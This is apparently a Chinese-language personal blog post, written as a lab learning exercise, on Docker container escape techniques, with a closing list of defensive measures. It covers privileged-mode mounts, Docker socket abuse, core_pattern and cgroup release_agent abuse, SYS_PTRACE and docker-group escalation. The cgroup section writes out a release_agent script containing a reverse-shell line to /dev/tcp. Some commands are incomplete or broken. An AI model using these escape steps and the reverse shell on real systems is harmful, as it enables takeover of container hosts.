      docker逃逸学习

      学一下docker逃逸相关的东西

      2026-04-05

      我们来学习一下有关docker逃逸相关的东西，分两个步骤来执行，分别是怎么判断当前shell是docker环境还是主机，有什么特殊机制或框架存在。第二步则是学习怎么去打docker逃逸获得宿主机的权限以及一些应用情况。

      环境判断

      在拿到webshell的时候，或者是已经变为持续化的后门shell的时候，我们都需要去判断，当前的这个主机是不是docker的，因为docker的局限会大一些，我们更希望拿到宿主机的权限，并且还有可能拿到宿主机下很多docker容器的权限，牵扯更广泛。

      常见虚拟环境

      因为docker是属于虚拟的环境，但是虚拟环境不止这一种，这里简单介绍一下常见的。

      • 虚拟主机

        虚拟主机是指在一台物理服务器上运行的多个虚拟主机实例，每个虚拟主机实例都拥有自己的环境和资源，通常用于提供Web托管服务

        注意：虚拟主机（Virtual Hosting）和虚拟机（Virtual Machine）是两个不同的概念，虚拟机是一个完整的虚拟化系统，包括操作系统、软件和硬件，可以在单个物理服务器上运行多个操作系统实例

      • Docker

        Docker是一种虚拟化技术，利用容器化的方式将应用程序及其依赖项打包成独立、轻量级的环境，实现快速部署、高效运行和跨平台运行的功能

      • K8s

        Kubernetes（通常简写为K8s）是一个开源的容器编排平台，通过自动化部署、扩展和管理容器化应用，实现高可用性、弹性和灵活性。它提供了集群管理、服务发现、负载均衡等功能，让用户可以更轻松地管理容器化应用的生命周期

      大概就是这几种，虚拟机没介绍是因为跟虚拟主机做对比了，就没介绍了。 还是多介绍一下吧，虚拟机是完全虚拟，所有的东西都是从主机上面分配给虚拟机的，环境都是虚拟的，但是可以作为一个完整的主机存在。但是大多数情况属于没什么用的东西，大部分用来做蜜罐了，没啥意义。虚拟主机是单纯分了一块空间去运行web程序，这种是我们可以去测试的，可能可以拿下物理机的权限，可以去分辨。

      docker逃逸手法

      OK，学习完了怎么判断虚拟环境对应是什么东西，我们回归正题，来学习怎么进行docker逃逸。首先先给个万金油的选择吧，就是工具直接跑，看有什么可以逃逸的。https://github.com/teamssix/container-escape-check，用这个工具，他会自动查询符合哪些docker逃逸的条件，然后直接去攻击即可。但是初学还是不能这么懒狗，自己学习一下怎么搞。

      特权模式

      特权模式逃逸是最简单有效的逃逸方法之一，当使用以特权模式（privileged参数）启动的容器时，就可以在docker容器内部 通过 mount 命令挂载外部主机磁盘设备，获得宿主机文件的读写权限。这里拉取了ubuntu的18.04版本的镜像，然后用参数开特权容器。

      1
2
3

      先创建一个特权容器：
docker pull ubuntu:18.04
docker run -it --privileged --rm ubuntu:18.04 /bin/bash

      OK，这里已经进来了，我们先看正常情况下，我们怎么确认是特权容器的。 先给命令

      1

      cat /proc/self/status | grep CapEff

      当你发现存在了很多个f的时候，基本上可以确定就是特权容器了。然后用fdisk -l 命令用于列出系统中所有磁盘设备的分区信息。就可以创建一个目录，从而挂载到宿主机的目录下了。

      1

mkdir -p /xxxx

      Docker Socket 逃逸

      这个其实跟上面的有点像，原理类似，后续操作不打，看看是什么个意思。

      Docker Socket（也称为Docker API Socket）是Docker引擎的UNIX套接字文件，用于与Docker守护进程（Docker daemon）进行通信，实现执行各种操作，例如创建、运行和停止容器，构建和推送镜像，查看和管理容器的日志等。

      简单来说就是，就是挂载这个这个文件之后，我们就可以进行通信了，去操作docker服务的宿主机，然后进行创建，删除，修改等。那就很简单了，后面都是跟前面的api逃逸手法一样了。

      Procfs危险挂载

      这里也是一个危险挂载，但是不一定需要特权容器了，就是比较方便。我们来挂载一下吧。

      1

      docker run -it --rm -v /proc/sys/kernel/core_pattern:/test2/proc/sys/kernel/core_pattern ubuntu:18.04 /bin/bash

      这个检查有没有问题很简单，这里也显示了，直接find，如果发现有两个文件，就基本说明挂载了这个目录了。

      1

      find / -name core_pattern

      介绍一下这个文件有什么作用： /proc/sys/kernel/core_pattern文件是负责 进程崩溃时 的内存数据转储，当第一个字符是管道符|时，后面的部分会以命令行的方式进行解析并运行。并且由于容器共享主机内核的原因，这个命令是以宿主机的权限运行的。
      利用该解析方式，可以进行容器逃逸。 所以我们现在找一下我们这个容器的工作目录是在宿主机的哪里。

      1

      cat /proc/mounts | xargs -d ',' -n 1 | grep workdir

      找到之后我们就可以去看这个work目录同级还有一个merged目录，是挂载点。可能怎么说比较混乱，我们直接去看这个目录吧。

      可以看到这里直接就是我们docker的根目录了，很明显是个挂载，所以我们就可以在docker里面写文件，然后让宿主机执行。一个反弹shell的exp。

#!/usr/bin/python

      Cgroup 配置错误

      先简单介绍一下这个是啥： Cgroup 是 Linux 提供的一种用于资源管理的功能，通过 Cgroup 可以对进程资源（如 CPU、内存等）的使用情况进行限制和统计。
      那我们怎么通过这个逃逸呢： 这种攻击利用了notify_on_release 和 release_agent 这两个 Cgroup 的机制，用于在 Cgroup 子目录资源被清空时执行特定的动作 实现逃逸。 利用条件 ● 以root用户身份在容器内运行 ● 使用SYS_ADMINLinux功能运行 ● 缺少AppArmor配置文件，否则将允许mountsyscall ● cgroup v1虚拟文件系统必须以读写的方式安装在容器内

      这些就是从网上搜到的了，我们来实验一下吧。先拉一个容器出来。

      1

      docker run -it --rm --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu:18.04 /bin/bash

      我们成功进去之后可以顺手判断一下是不是SYS_ADMIN的权限。 然后我们来判断符不符合攻击条件。

      1
2

      mount | grep cgroup
ls -l /sys/fs/cgroup

      需要是cgroup文件系统，并且权限为读写权限。

      然后我们来挂载一下这个文件系统。

      1
2

      mkdir /tmp/test3
mount -t cgroup -o memory cgroup /tmp/test3

      这里遇到了一个坑点，如果你的系统版本比较高，是cgroupv2的版本的，这个取决于宿主机，这里就不能直接挂载，需要特权容器才能挂载，但是特权容器就不用挂载这个了，我们这里纯练习，所以还是用特权容器吧。命令也要换一下。

      1

      mount -t cgroup2 none /tmp/test3

      挂载的命令。

      OK，成功挂载了。我们来创建一个配置目录。

      1

      mkdir /tmp/test3/conf

      然后我们启用通知机制，当 conf 子目录的任务（进程）清空时会触发内核动作。(启动内核那就很明显了，跟前面的打法差不多了)

      1

      echo 1 > /tmp/test3/conf/notify_on_release

      这里又执行失败了，还是版本问题，后续只能用文字说明了。

      1
2

      使用 sed 命令从 /etc/mtab 文件中解析出宿主机的路径前缀
sed -n '/^cgroup\|^cgroup2/p' /etc/mtab | head -n1 | awk '{print $2}'

      获得这个之后我们去设置一下。

      1

      host_path=sed -n 's/.*\perdir=[^,]*.*/\1/p' /etc/mtab

      /etc/mtab 记录了当前系统挂载的所有文件系统的信息，可以了解当前哪些设备或网络资源已经被挂载到文件系统中。通过获取宿主机的挂载路径，就可以在容器内部使用这个路径来操作宿主机上的文件
      这个路径会被用于配置 release_agent 然后设置 release_agent 为一个脚本的路径，通知事件触发时由内核执行该脚本，创建反弹 shell 的脚本，并写入其内容就可以了。

      1
2
3

      echo "$host_path/cmd" > /tmp/test3/release_agent
echo '#!/bin/sh' > /cmd  
echo "bash -i >& /dev/tcp/ip/8888 0>&1" >> /cmd

      SYS_PTRACE 进程注入

      先说原理和利用条件： 用户授予了容器SYS_PTRACE权限，并且与宿主机共享一个进程命名空间(–pid=host)，使得在容器内可以查看到宿主机的进程，并可以利用进程注入，反弹shell，从而实现逃逸 利用条件

      1. 容器有SYS_PTRACE权限
      2. 与宿主机共享一个进程命名空间
      3. 容器以root权限运行

      OK，我们来建一个容器看看。

      1

      docker run -it --rm --pid=host --cap-add=SYS_PTRACE ubuntu:18.04 /bin/bash

      docker用户组提权

      这个跟内核提权也很像，也是提权类似的操作。 基础知识： Docker 运行的所有命令都是需要 sudo 来运行，那是因为 docker 需要 root 权限才能运行 Docker 监护进程有一个特性，它能被允许访问 root 用户或者是在 docker 组里面的所有用户，就相当于拥有了root 的访问权限

      用法还是挺简单的，运行docker命令的时候整一个特权容器，或者特殊挂载什么的，就变成root逃逸出来，变成root权限了。

      针对docker逃逸的防御措施

      针对上面提到的手段，可以有如下防御措施：

      • 即时更新docker
      • docker使用capabilities时需要遵循最小特权原则
      • 尽量在启动容器时使用–user选项指定容器以非特权用户身份运行
      • 不要直接挂载主机文件，尽量使用数据卷或共享文件系统
      • 将容器中的root用户映射为宿主机中的普通用户
      • 不要在容器中挂载docker socket，也不要将docker api配置到公网
